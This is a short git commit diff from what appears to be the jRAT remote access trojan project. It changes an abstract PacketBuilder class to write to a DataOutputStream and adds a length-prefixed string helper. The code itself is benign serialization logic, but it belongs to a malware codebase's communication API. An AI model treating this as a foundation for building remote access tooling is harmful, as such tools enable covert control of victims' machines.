7b6693c72de8df2f7b66efb44d529ce8bed8ea3e
redpois0n <red@cmail.nu>
2013-06-18 18:14:32 +0200

    PacketBuilder

--- src/org/jrat/project/api/PacketBuilder.java
+++ src/org/jrat/project/api/PacketBuilder.java
@@ -1,8 +1,14 @@
 package org.jrat.project.api;
 
+import java.io.DataOutputStream;
 
 public abstract class PacketBuilder {
+		
+	public abstract void write(DataOutputStream dos) throws Exception;
 	
-	public abstract void write(RATObject rat) throws Exception;
+	public final void writeString(DataOutputStream dos, String s) throws Exception {
+		dos.writeShort(s.length());
+		dos.writeChars(s);
+	}
 	
 }
